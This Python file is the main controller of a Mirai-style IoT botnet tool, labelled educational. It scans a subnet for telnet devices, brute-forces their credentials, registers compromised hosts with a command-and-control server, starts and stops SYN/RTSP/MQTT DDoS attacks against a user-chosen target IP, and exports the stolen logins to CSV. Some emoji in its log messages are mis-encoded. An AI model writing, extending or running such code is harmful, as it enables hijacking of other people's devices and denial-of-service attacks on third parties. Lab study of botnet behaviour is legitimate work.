#!/usr/bin/env python3
"""
IoT Security Research - Main Exploit Script
Educational Purpose Only - For Controlled Lab Environment

This is the main entry point that orchestrates all IoT security research operations
using modular components for better maintainability and code organization.
"""

import sys
import os
import argparse
import logging
from datetime import datetime

# Add modules directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

# Import modular components
from network_scanner import NetworkScanner
from telnet_bruteforcer import TelnetBruteForcer
from c2_communicator import C2Communicator
from user_interface import UserInterface

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)


class IoTExploiter:
    """Main orchestrator class that coordinates all IoT security research operations"""
    
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.subnet = subnet or "11.10.10.0/24"
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        
        # Initialize modular components
        self.scanner = NetworkScanner(self.subnet, self.logger)
        self.bruteforcer = TelnetBruteForcer(self.logger)
        self.c2_comm = C2Communicator(cnc_server_ip, self.logger)
        self.ui = UserInterface(self.logger)
        
        # Data storage
        self.scan_results = []
        self.compromised_devices = []
        
        self.log("IoT Exploiter initialized successfully")
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logger.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices"""
        self.scan_results = self.scanner.scan_network()
        return self.scan_results
    
    def brute_force_telnet(self):
        """Brute force telnet credentials for discovered devices"""
        if not self.scan_results:
            self.log("No scan results available. Please run a scan first.")
            return
        
        self.compromised_devices = self.bruteforcer.brute_force_telnet(self.scan_results)
        
        # Register successful compromises with C2 server
        success_count = 0
        for device in self.compromised_devices:
            if self.c2_comm.register_compromised_device(
                device['ip'], 
                device['username'], 
                device['password']
            ):
                device['registered_c2'] = True
                success_count += 1
                self.log(f"[SUCCESS] Successfully registered {device['ip']} with C&C server")
            else:
                device['registered_c2'] = False
                self.log(f"[FAIL] Failed to register {device['ip']} with C&C server")
        
        if success_count > 0:
            self.log(f"Successfully registered {success_count}/{len(self.compromised_devices)} devices with C2")
            # Automatically verify C2 registration status
            self.log("üîÑ Verifying C2 registration status...")
            self.compromised_devices = self.c2_comm.verify_c2_registration_status(self.compromised_devices)
        
        return self.compromised_devices
    
    def start_ddos_via_c2(self):
        """Start DDoS attack via C2 server with user interaction"""
        if not self.compromised_devices:
            self.log("No compromised devices available. Please run brute-force first.")
            return
        
        target_ip = self.ui.get_user_input("Enter target IP to attack: ")
        if not target_ip:
            return
        
        attack_type = self.ui.get_user_input(
            "Enter attack type (syn/rtsp/mqtt): ", 
            ['syn', 'rtsp', 'mqtt']
        )
        if not attack_type:
            return
        
        success, result = self.c2_comm.start_ddos_via_c2(target_ip, attack_type)
        
        if success:
            self.log("DDoS attack initiated successfully")
            if result:
                successful_ips = result.get('successful_ips', [])
                failed_ips = result.get('failed_ips', {})
                self.log(f"Attack results: {len(successful_ips)} successful, {len(failed_ips)} failed")
        else:
            self.log("Failed to initiate DDoS attack")
    
    def stop_ddos_via_c2(self):
        """Stop DDoS attack via C2 server"""
        success, result = self.c2_comm.stop_ddos_via_c2()
        
        if success:
            self.log("DDoS attack stopped successfully")
            if result:
                stopped_count = result.get('stopped_count', 0)
                self.log(f"Stopped DDoS on {stopped_count} devices")
        else:
            self.log("Failed to stop DDoS attack")
    
    def print_status(self):
        """Print current status"""
        c2_connected = self.c2_comm.test_connection()
        self.ui.print_status(self.scan_results, self.compromised_devices, c2_connected)
    
    def save_results(self, prefix="results"):
        """Save results to files"""
        return self.ui.save_results(self.scan_results, self.compromised_devices, prefix)
    
    def fetch_data_from_c2(self):
        """Fetch scan results and compromised devices from C2 server"""
        self.log("Fetching data from C2 server...")
        
        # Fetch scan results
        c2_scan_results = self.c2_comm.fetch_scan_results_from_c2()
        if c2_scan_results:
            self.scan_results.extend(c2_scan_results)
            # Remove duplicates based on IP and port
            seen = set()
            unique_results = []
            for result in self.scan_results:
                key = (result['ip'], result['port'])
                if key not in seen:
                    seen.add(key)
                    unique_results.append(result)
            self.scan_results = unique_results
        
        # Fetch compromised devices
        c2_devices = self.c2_comm.fetch_compromised_devices_from_c2()
        if c2_devices:
            self.compromised_devices.extend(c2_devices)
            # Remove duplicates based on IP
            seen_ips = set()
            unique_devices = []
            for device in self.compromised_devices:
                if device['ip'] not in seen_ips:
                    seen_ips.add(device['ip'])
                    unique_devices.append(device)
            self.compromised_devices = unique_devices
    
    def handle_advanced_options(self):
        """Handle advanced options menu"""
        while True:
            self.ui.print_advanced_menu()
            choice = self.ui.get_user_input("Enter choice (1-7): ", ['1', '2', '3', '4', '5', '6', '7'])
            
            if choice == '1':
                new_cnc = self.ui.get_user_input(f"Enter new C2 server IP (current: {self.cnc_server_ip}): ")
                if new_cnc:
                    self.cnc_server_ip = new_cnc
                    self.c2_comm = C2Communicator(new_cnc, self.logger)
                    self.log(f"‚úÖ C2 server address updated to {new_cnc}")
            
            elif choice == '2':
                print("\nCredentials List:")
                credentials = self.bruteforcer.credentials
                for i, (username, password) in enumerate(credentials, 1):
                    print(f"{i}. '{username}':'{password}'")
            
            elif choice == '3':
                self._test_device_connectivity()
            
            elif choice == '4':
                self._export_devices_csv()
            
            elif choice == '5':
                self.ui.explain_registration_status()
            
            elif choice == '6':
                self.log("üîÑ Verifying C2 registration status...")
                self.compromised_devices = self.c2_comm.verify_c2_registration_status(self.compromised_devices)
                self.log("‚úÖ Registration status verification completed")
            
            elif choice == '7':
                break
            
            input("\nPress Enter to continue...")
    
    def _test_device_connectivity(self):
        """Test connectivity to compromised devices"""
        if not self.compromised_devices:
            self.log("‚ùå No compromised devices to test")
            return
        
        self.log("Testing device connectivity...")
        for device in self.compromised_devices:
            ip = device['ip']
            try:
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, 23))
                s.close()
                self.log(f"‚úÖ {ip} is reachable on port 23")
                device['status'] = 'online'
            except:
                self.log(f"‚ùå {ip} is not reachable on port 23")
                device['status'] = 'offline'
    
    def _export_devices_csv(self):
        """Export compromised devices to CSV"""
        if not self.compromised_devices:
            self.log("‚ùå No compromised devices to export")
            return
        
        filename = self.ui.get_user_input("Enter CSV filename (default: compromised_devices.csv): ")
        if not filename:
            filename = "compromised_devices.csv"
        
        try:
            with open(filename, 'w') as f:
                f.write("IP,Username,Password,Status,Registered_C2\n")
                for device in self.compromised_devices:
                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
            self.log(f"‚úÖ Exported {len(self.compromised_devices)} devices to {filename}")
        except Exception as e:
            self.log(f"‚ùå Error exporting to CSV: {e}")
    
    def interactive_menu(self):
        """Interactive menu for user control"""
        while True:
            self.ui.clear_screen()
            self.ui.print_banner()
            self.ui.print_menu()
            
            choice = self.ui.get_user_input("Enter your choice (1-9): ", 
                                          ['1', '2', '3', '4', '5', '6', '7', '8', '9'])
            
            if choice is None:  # User pressed Ctrl+C
                break
            
            if choice == '1':
                self.scan_network()
                
            elif choice == '2':
                self.brute_force_telnet()
                
            elif choice == '3':
                self.start_ddos_via_c2()
                
            elif choice == '4':
                self.stop_ddos_via_c2()
                
            elif choice == '5':
                self.print_status()
                
            elif choice == '6':
                if self.save_results():
                    self.log("Results saved successfully")
                else:
                    self.log("Failed to save results")
                    
            elif choice == '7':
                self.fetch_data_from_c2()
                
            elif choice == '8':
                self.handle_advanced_options()
                
            elif choice == '9':
                confirm = self.ui.get_user_input("Are you sure you want to exit? (y/n): ", ['y', 'n'])
                if confirm == 'y':
                    self.log("Exiting...")
                    break
            
            if choice != '9':
                input("\nPress Enter to continue...")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()
    
    # Create and run exploiter
    exploiter = IoTExploiter(args.cnc, args.subnet)
    
    try:
        # Test C2 connection first
        if exploiter.c2_comm.test_connection():
            exploiter.log("‚úÖ Successfully connected to C2 server")
        else:
            exploiter.log("‚ö†Ô∏è Warning: Cannot connect to C2 server. Some features may not work.")
        
        # Start interactive menu
        exploiter.interactive_menu()
        
    except KeyboardInterrupt:
        exploiter.log("Interrupted by user")
    except Exception as e:
        exploiter.log(f"Unexpected error: {e}")
    finally:
        exploiter.log("Exploit script terminated")


if __name__ == "__main__":
    main()
